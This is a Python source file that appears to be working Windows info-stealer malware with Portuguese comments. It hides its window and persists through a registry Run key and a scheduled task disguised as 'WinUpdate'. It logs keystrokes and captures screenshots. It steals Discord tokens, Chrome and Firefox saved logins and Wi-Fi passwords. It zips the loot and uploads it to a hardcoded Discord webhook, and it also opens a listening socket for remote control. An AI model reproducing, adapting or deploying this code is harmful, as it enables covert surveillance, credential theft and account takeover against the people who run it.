# -*- coding: utf-8 -*-
# grabber_dw.pyw  ->  discord-webhook edition
import os, sys, time, json, sqlite3, zipfile, tempfile, threading, subprocess, shutil, socket
from datetime import datetime
from pynput.keyboard import Listener
from PIL import ImageGrab
import requests, psutil, win32crypt

### CONFIGURE AQUI ###
WEBHOOK_URL    = "https://discord.com/api/webhooks/1485374322683023503/-79Jg_x6lozcbc82T98m1-SPp9h0X2SP3gWEg2TSTB-m9DTnhWmw8zLbuV32R_KYaEtI"
SCREEN_DELTA   = 30          # segundos entre prints
KEYLOG_CYCLE   = 60          # segundos entre uploads
HOST_VNC       = "0.0.0.0"   # para controle remoto
PORT_VNC       = 4777
PERSIST_NAME   = "WinUpdate"
### FIM CONFIG ###

LOOT_DIR   = os.path.join(tempfile.gettempdir(), PERSIST_NAME)
KEYLOG_FILE= os.path.join(LOOT_DIR, "k.txt")
os.makedirs(LOOT_DIR, exist_ok=True)

def hide():
    import win32gui, win32console
    win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)

def persist():
    dst = os.path.join(os.environ["APPDATA"], f"{PERSIST_NAME}.exe")
    if not os.path.exists(dst) or not dst == sys.executable:
        shutil.copy2(sys.executable, dst)
    try:
        import winreg as reg
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
 r"Software\Microsoft\Windows\CurrentVersion\Run",
 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, PERSIST_NAME, 0, reg.REG_SZ, dst)
        reg.CloseKey(key)
    except:
        pass
    try:
        subprocess.run(f'schtasks /create /tn "{PERSIST_NAME}" /tr "{dst}" /sc ONLOGON /rl HIGHEST /f',
                       capture_output=True, shell=True)
    except:
        pass

def on_press(key):
    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
        k = str(key).replace("'", "")
        if k == "Key.enter":      f.write("\n")
        elif k == "Key.space":    f.write(" ")
        elif k.startswith("Key"): f.write(f"[{k[4:]}]")
        else:                      f.write(k)

def keylogger_thread():
    Listener(on_press=on_press).run()

def shooter():
    while True:
        t = int(time.time())
        ImageGrab.grab().save(os.path.join(LOOT_DIR, f"{t}.png"))
        time.sleep(SCREEN_DELTA)

def get_discord_tokens():
    roaming = os.environ["APPDATA"]
    paths = {
        "Discord": roaming + r"\discord\Local Storage\leveldb",
        "Discord PTB": roaming + r"\discordptb\Local Storage\leveldb",
        "Discord Canary": roaming + r"\discordcanary\Local Storage\leveldb",
        "Lightcord": roaming + r"\Lightcord\Local Storage\leveldb"
    }
    tokens = []
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith(".ldb"):
                continue
            try:
                with open(os.path.join(path, file), errors="ignore") as f:
                    txt = f.read()
                    for word in txt.split():
                        if len(word) == 59 and "." in word[:-5]:
                            tokens.append(word)
            except:
                pass
    with open(os.path.join(LOOT_DIR, "tokens.txt"), "w") as f:
        f.write("\n".join(set(tokens)))
    return tokens

def chrome_pass():
    login_db = os.environ["LOCALAPPDATA"] + r"\Google\Chrome\User Data\Default\Login Data"
    tmp_db = tempfile.mktemp(suffix=".db")
    shutil.copy2(login_db, tmp_db)
    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    with open(os.path.join(LOOT_DIR, "chrome_pass.txt"), "w", encoding="utf-8") as f:
        for url, user, pwd in cursor.fetchall():
            try:
                pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
            except:
                pwd = "<n/a>"
            f.write(f"{url} | {user} | {pwd}\n")
    conn.close()
    os.remove(tmp_db)

def firefox_pass():
    prof = os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
    for folder in os.listdir(prof):
        db = os.path.join(prof, folder, "logins.json")
        if not os.path.exists(db):
            continue
        try:
            with open(db) as f:
                data = json.load(f)["logins"]
            with open(os.path.join(LOOT_DIR, "firefox_pass.txt"), "w") as f:
                for entry in data:
                    f.write(f"{entry['hostname']} | {entry['encryptedUsername']} | {entry['encryptedPassword']}\n")
        except:
            pass

def wifi():
    try:
        out = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        nets = [ln.split(":")[1].strip() for ln in out.splitlines() if "All User Profile" in ln]
        with open(os.path.join(LOOT_DIR, "wifi.txt"), "w") as f:
            for net in nets:
                try:
                    pwd = subprocess.check_output(f'netsh wlan show profile "{net}" key=clear',
                                                  shell=True).decode(errors="ignore")
                    pwd = [ln.split(":")[1].strip() for ln in pwd.splitlines() if "Key Content" in ln][0]
                    f.write(f"{net} : {pwd}\n")
                except:
                    pass
    except:
        pass

def zip_and_ship():
    zpath = os.path.join(tempfile.gettempdir(), f"{int(time.time())}.zip")
    with zipfile.ZipFile(zpath, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.setpassword(b"minhasenha123")
        zf.write(KEYLOG_FILE, arcname="keylog.txt")
        for root, _, files in os.walk(LOOT_DIR):
            for file in files:
                if file == "k.txt":  # já gravamos acima
                    continue
                zf.write(os.path.join(root, file), arcname=file)
    # upload webhook discord
    with open(zpath, "rb") as f:
        files = {"file": (os.path.basename(zpath), f, "application/zip")}
        requests.post(WEBHOOK_URL, files=files)
    os.remove(zpath)
    # limpa loot local
    open(KEYLOG_FILE, "w").close()
    for img in [i for i in os.listdir(LOOT_DIR) if i.endswith(".png")]:
        os.remove(os.path.join(LOOT_DIR, img))

def handle_client(conn):
    while True:
        data = conn.recv(1024).decode().strip()
        if data == "print":
            tmp = tempfile.mktemp(suffix=".png")
            ImageGrab.grab().save(tmp)
    conn.close()

def vnc_server():
    s = socket.socket()
    s.bind((HOST_VNC, PORT_VNC))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn,), daemon=True).start()

def main():
    hide()
    persist()
    threading.Thread(target=keylogger_thread, daemon=True).start()
    threading.Thread(target=shooter, daemon=True).start()
    threading.Thread(target=vnc_server, daemon=True).start()
    # primeira coleta
    time.sleep(10)
    get_discord_tokens()
    try:
        chrome_pass()
    except:
        pass
    try:
        firefox_pass()
    except:
        pass
    try:
        wifi()
    except:
        pass
    # loop upload
    while True:
        time.sleep(KEYLOG_CYCLE)
        zip_and_ship()

if __name__ == "__main__":
    main()
